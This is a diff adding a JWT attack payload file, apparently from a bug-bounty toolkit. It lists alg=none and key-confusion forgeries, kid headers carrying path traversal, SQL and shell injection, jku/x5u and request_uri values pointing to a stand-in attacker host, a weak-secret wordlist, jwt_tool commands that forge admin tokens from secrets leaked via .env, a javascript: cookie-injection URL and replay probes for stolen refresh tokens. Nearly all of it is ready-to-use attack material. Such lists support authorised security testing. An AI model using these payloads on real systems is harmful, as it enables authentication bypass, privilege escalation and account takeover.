@@ -1,0 +1,103 @@
+# JWT attack payloads / header tampering recipes
+# Decode with: echo "$JWT" | cut -d. -f1 | base64 -d | jq
+
+# --- alg=none ---
+Header:  {"alg":"none","typ":"JWT"}
+Payload: {"sub":"admin","role":"admin","exp":9999999999}
+Signature: (empty)
+
+# alg casing bypass (some libs normalize, some don't)
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"nOnE","typ":"JWT"}
+
+# --- RS256 -> HS256 key confusion ---
+# Take server's RSA public key (from /.well-known/jwks.json, TLS cert, or JKU)
+# Treat it as an HMAC secret and re-sign:
+Header: {"alg":"HS256","typ":"JWT"}
+# Then: HMAC-SHA256(public_key_pem_bytes, base64url(header)+"."+base64url(payload))
+
+# --- kid header injection ---
+{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}      # known-content file, secret = ""
+{"alg":"HS256","typ":"JWT","kid":"/dev/null"}
+{"alg":"HS256","typ":"JWT","kid":"../../etc/hostname"}
+{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'AAAA' -- "}
+{"alg":"HS256","typ":"JWT","kid":"'; DROP TABLE keys; --"}
+{"alg":"HS256","typ":"JWT","kid":"$(whoami)"}
+
+# --- jku / x5u header injection ---
+{"alg":"RS256","jku":"https://attacker.tld/jwks.json","typ":"JWT"}
+{"alg":"RS256","jku":"https://target.tld@attacker.tld/jwks.json"}
+{"alg":"RS256","jku":"https://target.tld.attacker.tld/jwks.json"}
+{"alg":"RS256","x5u":"https://attacker.tld/cert.pem"}
+{"alg":"RS256","x5c":["<attacker-controlled-cert-b64>"]}
+
+# --- Weak-secret wordlists (feed to jwt_tool -C -d) ---
+# Try first:
+secret
+Secret
+password
+changeme
+default
+jwt
+jwtsecret
+mysecret
+your-256-bit-secret
+123456
+admin
+
+# --- Claim tampering ---
+# Privilege escalation
+{"sub":"victim","role":"admin","iss":"trusted","aud":"api"}
+{"sub":"victim","scope":"admin read write delete","permissions":["*"]}
+# Expiration bypass
+{"exp":9999999999}
+{"exp":null}
+# Remove exp entirely
+# Issuer confusion
+{"iss":"https://attacker.tld"}
+
+# --- Embedded JWT in JWT (nested JWS) ---
+# Put an attacker-signed JWT as a claim value to confuse validators
+
+# --- psychic-signatures-style null byte/empty sig ---
+<header>.<payload>.
+<header>.<payload>.AAAA
+
+# --- Unverified JWKS rotation ---
+# If server caches JWKS by kid and trusts new kid, register new kid with your public key
+
+# ============================================================================
+# 2024-2026 Bug Bounty Additions (see methodology/bounty_patterns_2024_2026.md)
+# ============================================================================
+
+# --- P2: request_uri JAR bypass (CVE-2024-10318 family) ---
+# Test IdP endpoints that accept JAR / request_uri with attacker-hosted JWT.
+# IdP must (but often doesn't) validate the JWT signature + aud + iss + registered client_id.
+# Curl probe:
+# curl -s "https://idp.target/authorize?client_id=X&request_uri=https://attacker.tld/jar.jwt"
+# JWT payload hosted at attacker-controlled request_uri:
+{"iss":"attacker","aud":"idp","client_id":"victim","redirect_uri":"https://attacker.tld/cb","response_type":"code","scope":"openid profile email","nonce":"FIXED","state":"ATTACKER"}
+# Signing variants to try against the IdP:
+# - alg:none (P2 + alg:none compound)
+# - HS256 with leaked static secret
+# - RS256 with attacker JWKS hosted at request_uri host
+
+# --- P3: .env-leaked JWT_SECRET forging recipe ---
+# After finding /.env, /.env.example, /.env.bak, /.git/config, /config.php.bak, etc.
+# extract JWT_SECRET / SECRET_KEY / JWT_PRIVATE_KEY and forge:
+# jwt_tool -S hs256 -p "$LEAKED_SECRET" -I -pc role -pv admin -pc sub -pv 1 "$EXISTING_JWT"
+# Combine with open-redirect sink to deliver forged cookie cross-origin:
+# https://target.tld/login/callback?next=javascript:document.cookie='jwt='+FORGED
+
+# --- P4: refresh-token silent-persistence probes ---
+# After capturing a refresh token, run each probe in order:
+# 1) Replay RT after user password reset — should fail; if succeeds → finding.
+# 2) Replay RT after user "sign out everywhere" — should fail; if succeeds → finding.
+# 3) Replay same RT ≥10 times in a row — should rotate; no rotation → finding.
+# 4) Replay RT from a different IP/UA — should be detected; silent success → finding.
+# Canonical POST body:
+# grant_type=refresh_token&refresh_token=$STOLEN_RT&client_id=$CID[&client_secret=$CSEC]
+# Additional keys to test for DPoP / mTLS sender-constraint bypass:
+{"DPoP":"<forged-dpop-jwt>"}
+{"cnf":{"jkt":"<any-thumbprint>"}}
